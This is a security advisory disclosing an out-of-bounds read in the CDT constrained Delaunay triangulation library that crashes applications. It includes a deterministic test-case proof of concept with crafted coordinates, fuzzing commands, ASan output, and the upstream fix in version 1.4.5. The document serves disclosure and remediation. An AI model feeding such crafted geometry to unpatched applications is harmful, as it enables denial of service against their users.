# CDT: Out-of-Bounds Read in `CDT::opposedVertexInd()` leads to Denial of Service

- **Advisory ID:** MCSAID-2025-017
- **CVE ID:** [CVE-2025-15647](https://www.cve.org/CVERecord?id=CVE-2025-15647)
- **Reported:** 2025-11-05
- **Published:** 2026-09-16
- **Severity:** Medium (CVSS 5.5 – AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)
- **Vulnerability type:** Out-of-bounds read, Denial of Service (DoS), Application crash
- **Current state:** Fix released by vendor in CDT 1.4.5
- **Exploitation:** Easy, not seen in the wild
- **Software:** [CDT (Constrained Delaunay Triangulation)](https://github.com/artem-ogre/CDT)
- **CWE:** [CWE-125: Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)
- **Discovered by:** Vlatko Kosturjak of Marlink Cyber

---

## Summary

CDT is a header-only C++ library for constrained Delaunay triangulation. When constraint edges intersect and intersection resolution is enabled (`IntersectingConstraintEdges::TryResolve`), the intersection point is computed in floating point and can round to a position outside the two triangles adjacent to the edge being split. Inserting the split vertex there produces an inverted triangle and corrupts the triangulation topology.

The subsequent edge-insertion walk then runs past the convex hull and indexes the triangle array with the `noNeighbor` sentinel, producing an out-of-bounds read in `CDT::opposedVertexInd()` (`CDTUtils.hpp:175`) and a segmentation fault.

---

## Affected Versions

| Version | Status |
|---------|--------|
| CDT <= 1.4.4 (including git master `7bd85e41a7b2`) | Vulnerable |
| CDT 1.4.5 and later | Fixed |

Applications are affected when they call `insertEdges()` with constraint edges that may intersect and construct the triangulation with `IntersectingConstraintEdges::TryResolve`.

---

## Impact

An application embedding CDT that triangulates untrusted or externally supplied geometry (e.g. imported CAD/GIS/mesh data) can be crashed by input containing near-degenerate or nearly parallel intersecting constraint edges. The result is a denial of service; because the invalid state also corrupts triangulation topology before the crash, the library may produce wrong results prior to faulting.

---

## Exploitation

Exploitation requires only supplying crafted geometry to the triangulation routines — via the library's file parser or directly through the `insertVertices()` / `insertEdges()` API. The reachable condition is data-dependent floating-point rounding, so it is also encountered accidentally with real-world inputs (see upstream issues #211 and #212).

---

## Details

### Root cause

With `IntersectingConstraintEdges::TryResolve`, `insertEdgeIteration()` computes the intersection point of two constraint edges and inserts it as a split vertex. The computed point is not validated to lie inside either of the two triangles adjacent to the split edge. When rounding places it outside, an inverted triangle is created; the edge-insertion walk that follows then dereferences `triangles[noNeighbor]` and `opposedVertexInd()` reads out of bounds:

1. `CDT::Triangulation<>::insertEdge()` – `Triangulation.hpp:681`
2. `CDT::Triangulation<>::insertEdgeIteration()` – `Triangulation.hpp:530`
3. `CDT::opposedVertex()` – `CDTUtils.hpp:203`
4. `CDT::opposedVertexInd()` – **`CDTUtils.hpp:175`** ← crash

### Proof of Concept

A minimal, fully deterministic reproducer (a nearly closed polygon with an intersection close to an endpoint):

```cpp
TEST_CASE("near-endpoint intersection", "") {
    auto cdt = Triangulation<float>(
        VertexInsertionOrder::Auto,
        IntersectingConstraintEdges::TryResolve,
        0.0f);
    cdt.insertVertices({
        {-0.586449921f, -0.606724977f},
        {-0.591448665f, -0.546940088f},
        {-0.597282887f, -0.475633264f},
        {-0.591453075f, -0.546887279f},
        {-0.586451471f, -0.606724977f},
    });
    cdt.insertEdges({
        {VertInd(0), VertInd(1)},
        {VertInd(1), VertInd(2)},
        {VertInd(2), VertInd(3)},
        {VertInd(3), VertInd(4)},
        {VertInd(4), VertInd(0)},
    });
    REQUIRE(CDT::verifyTopology(cdt));
}
```

The issue was originally found by fuzzing, using a harness that parses `<nVerts> <nEdges>` followed by vertex coordinates and edge index pairs and feeds them to `insertVertices()` / `insertEdges()`:

```bash
./fuzz_direct_api poc_01.bin   # direct API harness
./fuzz_file_parser poc_01.bin  # file parser harness
```

### ASan output

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3410264==ERROR: AddressSanitizer: SEGV on unknown address 0x517800000074 (pc 0x61a4c690d2c2 bp 0x7fff6a2d4f10 sp 0x7fff6a2d4c40 T0)
==3410264==The signal is caused by a READ memory access.
    #0 0x61a4c690d2c2 in CDT::opposedVertexInd(std::array<unsigned int, 3ul> const&, unsigned int) /htp/cdt/CDT/CDT/include/CDTUtils.hpp:175:5
    #1 0x61a4c690d2c2 in CDT::opposedVertex(CDT::Triangle const&, unsigned int) /htp/cdt/CDT/CDT/include/CDTUtils.hpp:203:25
    #2 0x61a4c690d2c2 in CDT::Triangulation<double, CDT::LocatorKDTree<...>>::insertEdgeIteration(...) /htp/cdt/CDT/CDT/include/Triangulation.hpp:530:31
    #3 0x61a4c6909fe3 in CDT::Triangulation<double, CDT::LocatorKDTree<...>>::insertEdge(...) /htp/cdt/CDT/CDT/include/Triangulation.hpp:681:9
    #4 0x61a4c6909fe3 in void CDT::Triangulation<double, CDT::LocatorKDTree<...>>::insertEdges<...>(...) /htp/cdt/CDT/CDT/include/Triangulation.h:1117:9
    #5 0x61a4c68d3c18 in CDT::Triangulation<double, CDT::LocatorKDTree<...>>::insertEdges(std::vector<CDT::Edge> const&) /htp/cdt/CDT/CDT/include/Triangulation.hpp:309:5
    #6 0x61a4c68d3c18 in fuzz_target(unsigned char const*, unsigned long) fuzz_direct_api.cpp:102:17
    #7 0x61a4c68d3c18 in main fuzz_direct_api.cpp:135:9

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /htp/cdt/CDT/CDT/include/CDTUtils.hpp:175:5 in CDT::opposedVertexInd(std::array<unsigned int, 3ul> const&, unsigned int)
==3410264==ABORTING
```

Build and test platform: Ubuntu 24.04.3, harness built with `-fsanitize=address`.

---

## Mitigations

The upstream fix ([PR #216](https://github.com/artem-ogre/CDT/pull/216), merge commit [c8aa787](https://github.com/artem-ogre/CDT/commit/c8aa787e8d24dbea61ad43f0bd4754cb6d894856)):

- Validates the computed split vertex before inserting it — it must lie inside one of the two triangles sharing the split edge (robust predicates, two orientation tests). Otherwise a new `InvalidEdgeSplitVertex` exception is thrown instead of corrupting the triangulation.
- Guards triangle access in the edge-insertion walk against the `noNeighbor` sentinel with a checked accessor, so a walk reaching the boundary raises a clear exception instead of reading out of bounds.
- Adds regression tests for this issue and for the related upstream issue #211.

Note that the library still cannot guarantee that every constraint-edge intersection is resolvable; near-degenerate intersections at very small `minDistToConstraintEdge` now fail with an exception instead of crashing.

---

## Recommendations

- Upgrade to [CDT 1.4.5](https://github.com/artem-ogre/CDT/releases/tag/1.4.5) or later.
- Handle the exceptions thrown by `insertEdges()` and retry with a larger `minDistToConstraintEdge`, which makes intersection resolution more robust.
- Validate and sanitize externally supplied geometry before passing it to the triangulation.

---

## Timeline

- 2025-11-05 – Vulnerability reported to the CDT maintainer (GitHub issue #212)
- 2026-07-16 – Independent report of the same crash by another user
- 2026-07-20 – Maintainer identified the root cause and opened the fix PR (#216)
- 2026-07-21 – Fix merged upstream (`c8aa787`)
- 2026-07-22 – CDT 1.4.5 released with the fix
- 2026-09-16 – Public advisory released

---

## References

- GitHub Issue: [Out-of-bounds memory access in CDT::opposedVertexInd() leading to segmentation fault (SEGV)](https://github.com/artem-ogre/CDT/issues/212)
- Upstream fix: [PR #216 – Fix crash on unresolvable constraint edges intersection](https://github.com/artem-ogre/CDT/pull/216)
- Related upstream issue: [#211](https://github.com/artem-ogre/CDT/issues/211)
- Release: [CDT 1.4.5](https://github.com/artem-ogre/CDT/releases/tag/1.4.5)
- Marlink Cyber Security Advisory: [MCSAID-2025-017](https://github.com/marlinkcyber/advisories/blob/main/advisories/MCSAID-2025-017-cdt-out-of-bounds-read-opposedvertexind.md)
- Software: [CDT](https://github.com/artem-ogre/CDT)
